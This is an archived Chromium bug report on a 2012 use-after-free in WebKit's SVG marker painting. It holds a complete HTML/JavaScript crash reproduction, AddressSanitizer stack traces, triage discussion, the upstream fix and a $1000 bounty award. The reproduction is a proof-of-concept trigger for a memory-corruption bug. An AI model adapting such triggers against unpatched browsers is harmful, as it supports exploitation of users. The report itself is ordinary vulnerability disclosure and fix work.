# Heap-use-after-free in WebCore::RenderSVGContainer::paint

| Field | Value |
|-------|-------|
| **Issue ID** | [40057426](https://issues.chromium.org/issues/40057426) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | mi...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2012-04-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::RenderSVGContainer::paint

**VERSION**  

Chrome Version: stable + dev

Chromium 20.0.1121.0 (Developer Build 134273)  

OS Linux  

WebKit 536.10 (@115413)

Operating System: 64bit precise

**REPRODUCTION CASE**

yes, it has counters.

<html>
<head>
<style>
#el1 {
border-left-style: double;
}
#el3 {
content: counter(c);
}
</style>
<script>
onload = function() {
el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
el0.setAttribute('marker-mid', 'url(#el4)')
document.body.appendChild(el0)
el1=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
el1.setAttribute('id','el1')
document.body.appendChild(el1)
el2=document.createElementNS('http://www.w3.org/2000/svg', 'path')
el2.setAttribute('d', 'M 0 0 s 0 0 0 0 C 0 0 0 0 0 400 c 0 0 0 400 400 0')
el0.appendChild(el2)
el3=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
el3.setAttribute('id','el3')
el1.appendChild(el3)
el4=document.createElementNS('http://www.w3.org/2000/svg', 'marker')
el4.setAttribute('id','el4')
el3.appendChild(el4)
scrollTo(0, 60)
document.body.style.zoom=0.1
document.designMode='on'
document.execCommand('selectall')
document.designMode='off'
setTimeout("location.reload()", 100)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab + asan  

Crash State:

==12506== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed57ae80 at pc 0x55555bb9957d bp 0x7fffffff0710 sp 0x7fffffff0708  

READ of size 8 at 0x7fffed57ae80 thread T0  

#0 0x55555bb9957d in WebCore::RenderSVGContainer::paint(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#1 0x55555bb313c3 in WebCore::RenderSVGResourceMarker::draw(WebCore::PaintInfo&, WebCore::AffineTransform const&) ???:0  

#2 0x55555bb4882e in WebCore::SVGMarkerLayoutInfo::drawMarkers(WebCore::PaintInfo&) ???:0

0x7fffed57ae80 is located 0 bytes inside of 240-byte region [0x7fffed57ae80,0x7fffed57af70)  

freed by thread T0 here:  

#0 0x55555e1e0eb2 in free ??:0  

#1 0x55555939d134 in WebCore::Node::detach() ???:0  

#2 0x55555935ee1c in WebCore::Element::detach() ???:0  

#3 0x5555592cb059 in WebCore::ContainerNode::detach() ???:0

## Attachments

- [0240.txt](attachments/0240.txt) (text/x-c; charset=us-ascii, 11.4 KB)
- [0240.html](attachments/0240.html) (text/html; charset=us-ascii, 1.2 KB)
- [stable-0240.txt](attachments/stable-0240.txt) (text/x-c; charset=us-ascii, 11.9 KB)

## Timeline

### in...@chromium.org (2012-04-27)

Can you trigger this without the counter ? 

### in...@chromium.org (2012-04-27)

[Empty comment from Monorail migration]

### ke...@chromium.org (2012-04-27)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=40396751

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f05ba9cdc80
Crash State:
  - crash stack -
  WebCore::RenderSVGContainer::paint
  WebCore::RenderSVGResourceMarker::draw
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=124014:124069

Minimized Testcase (1.12 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95qgpgnWoC4fb6XTlpPrTkF4VmLQTeWPakagWk_1pBDzrJn4d2gMlcEc_F_qm5HYsUL2r_miKTOG84esOZp4aWDGXpMu8TtaKgsA7iAUB73q-pFL_DCuRKafnJzabZnLyUDF624kIa8OYjf6JDicjD3koBpMQ

### in...@chromium.org (2012-04-30)

Stephen, can you please hunt the regresse :)

### sc...@chromium.org (2012-04-30)

Damn. Repros in Asan build of chrome but not debug build (i.e. don't hit asserts). I'll look into it more tomorrow, including regression range (although it's probably always been present) and figuring out exactly what's going wrong.

### sc...@chromium.org (2012-05-08)

I could not figure out why ASAN is complaining about this. I'm not quite certain yet, but explicitly tracking the malloc/use/free with printf causes the crash in ASAN builds but the object in question has not been deleted.

If this is indeed an ASAN false positive, I suspect the problem lies in the arena allocation code used for WebCore Element objects. While it seems that ASAN builds bypass all of this code, there may be some piece of code that is not bypassed that is hit in this execution.

Does anyone on the security team have insight on what to do in a situation like this?

### se...@chromium.org (2012-05-08)

Sorry if this is old news, but I once ran into a bunch of valgrind warnings on RenderArena-allocated things in a Release build.  The RenderArena stuff seems to compile differently for release, debug, and ASAN.  Forcing it to the simple (malloc) implementation made valgrind shut up, but it looks like ASAN is already doing that (assuming ADDRESS_SANITIZER is being defined):

#ifdef ADDRESS_SANITIZER
    return ::malloc(size);
#elif !defined(NDEBUG)
    // Use standard malloc so that memory debugging tools work.
    ASSERT(this);
    void* block = ::malloc(debugHeaderSize + size);
    RenderArenaDebugHeader* header = static_cast<RenderArenaDebugHeader*>(block);
    header->arena = this;
    header->size = size;
    header->signature = signature;
    return static_cast<char*>(block) + debugHeaderSize;
#else
    ...
#endif


### [Deleted User] (2012-05-14)

Filed upstream: https://bugs.webkit.org/show_bug.cgi?id=86392

### sc...@chromium.org (2012-05-14)

When creating upstream WebKit bugs, please be sure to CC people who have previously commented on the Chromium bug, like me and pdr and senorblanco.


### in...@chromium.org (2012-05-16)

m19 is out, moving milestone m18 bugs to m19.

### in...@chromium.org (2012-05-21)

Stephen, we are currently in a heavy bug knockout mode for bugs affecting stable. This is one of the last few ones left. Can you please poke some svg reviewer for Niko's patch upstream.

### sc...@chromium.org (2012-05-21)

[Comment Deleted]

### sc...@chromium.org (2012-05-21)

Rob Buis has said he'll look at it today.

### sc...@chromium.org (2012-05-22)

WebKit Committed r117971: <http://trac.webkit.org/changeset/117971> by Nikolas Zimmermann.

### ke...@chromium.org (2012-05-22)

This looks like a fairly hefty merge. scarybeasts can make the call on it.

### sc...@gmail.com (2012-05-22)

Yeah, also just hours old so this is not a suitable merge candidate to M19 at this point.

It is a suitable candidate for reward-topanel, though :)

### sc...@gmail.com (2012-05-23)

Nice bug miaubiz. $1000

### cl...@chromium.org (2012-05-23)

ClusterFuzz has detected this issue as fixed in range 138307:138403.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=40396751

Uploader: kenrb@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f05ba9cdc80
Crash State:
  - crash stack -
  WebCore::RenderSVGContainer::paint
  WebCore::RenderSVGResourceMarker::draw
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=124014:124069
Fixed: https://cluster-fuzz.appspot.com/revisions?range=138307:138403

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95qgpgnWoC4fb6XTlpPrTkF4VmLQTeWPakagWk_1pBDzrJn4d2gMlcEc_F_qm5HYsUL2r_miKTOG84esOZp4aWDGXpMu8TtaKgsA7iAUB73q-pFL_DCuRKafnJzabZnLyUDF624kIa8OYjf6JDicjD3koBpMQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-05-30)

M20: http://trac.webkit.org/changeset/118880

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/125374?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057426)*
